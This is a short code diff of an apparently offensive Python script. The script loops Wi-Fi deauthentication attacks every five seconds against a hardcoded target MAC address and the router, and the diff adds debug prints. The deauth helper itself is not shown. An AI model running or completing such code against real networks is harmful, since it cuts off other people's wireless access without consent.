@@ -7,10 +7,11 @@ def init(host_socket):
     pass
 
 def run(cmd):
-    target_mac = nt.get_mac_address("10.10.26.8")
+    target_mac = "b4:0b:1d:c4:71:ab"
     router_mac = nt.get_router_mac()
+    print(target_mac)
+    print(router_mac)
     while True:
-
         deauth(target_mac, router_mac )
         time.sleep(5)
 
